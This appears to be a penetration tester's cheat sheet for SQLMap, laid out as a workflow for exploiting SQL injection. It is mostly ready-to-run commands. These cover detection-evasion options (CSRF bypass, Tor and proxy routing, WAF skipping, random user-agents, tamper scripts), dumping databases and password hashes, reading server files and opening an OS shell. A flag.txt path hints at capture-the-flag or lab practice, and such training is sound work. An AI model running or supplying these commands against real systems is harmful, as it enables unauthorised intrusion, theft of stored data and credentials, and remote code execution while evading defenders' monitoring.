[[Injection/SQL Injection]]
- Find SQL injection vulnerabilities before executing SQLMap for PoC.
- Multi-threading can be bad for time-based data retrieval.
- Risk > 3 to enable 'OR' based injections
- Data retrieval sometimes doesn't work for UNION, TIME-BASED or BOOLEAN (--no-cast) might help.

Testing command
- [ ] --batch to allow 'Y' for everything
```bash
sqlmap -u 'http://example.com' --risk=3 --level=5 --threads=5 --batch
```
JSON + Complex request
```bash
sqlmap -r req.txt -p 'param1' -p 'param2'
```
### Defense Evasion
Bypass CSRF tokens
```bash
sqlmap -u 'http://example.com' --risk=3 --level=5 --threads=5 --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
Randomize values
```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```
Calculated Parameters
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
```
Proxying
- [ ] List of proxy --proxy-file
- [ ] Tor: --tor
```bash
sqlmap -u 'http://example.com' --risk=3 --level=5 --threads=5 --batch --proxy="socks4://177.39.187.70:33283"
```
Skip WAF
```bash
sqlmap -u 'http://example.com' --risk=3 --level=5 --threads=5 --batch --skip-waf
```
Random user-agent
SQLMAP - User-agent: sqlmap/1.4.9 (http://sqlmap.org)
```bash
sqlmap -u 'http://example.com' --risk=3 --level=5 --threads=5 --batch --random-agent
```
Tamper Scripts
```bash
sqlmap -u 'http://example.com' --risk=3 --level=5 --threads=5 --tamper=between, randomcase
```
![](../../img/Pasted%20image%2020251027095038.png)
### Data Exfiltration
- [ ] Check Version (--banner)
- [ ] Check user and check admin (--current-user --is-dba) -> privilege to read files
- [ ] Check database (--current-db)
```bash
sqlmap -r req.txt --banner --current-user --current-db --is-dba
```
Database, Tables and Columns
- [ ] Dump all tables (--tables & require -D)
- [ ] Conditional (--where="name LIKE 'f%'")
- [ ] Dump all (--dump-all) & exclude system db (not interesting, --exclude-sysdbs)
```bash
sqlmap -r req.txt --dump -D database -T table1 -C column1,column2
```
Dumping schema
```bash
sqlmap -r req.txt --dump -D database --schema
```
Searching for data
```bash
sqlmap -r req.txt --search -T users
```
DB Users passwords
```bash
sqlmap -r req.txt --passwords
```

**Attack Escalation**
- [ ] Is database admin
Reading files
```bash
sqlmap -r req.txt --file-read "/var/www/html/flag.txt"
```
RCE
```bash
sqlmap -r req.txt --os-shell
```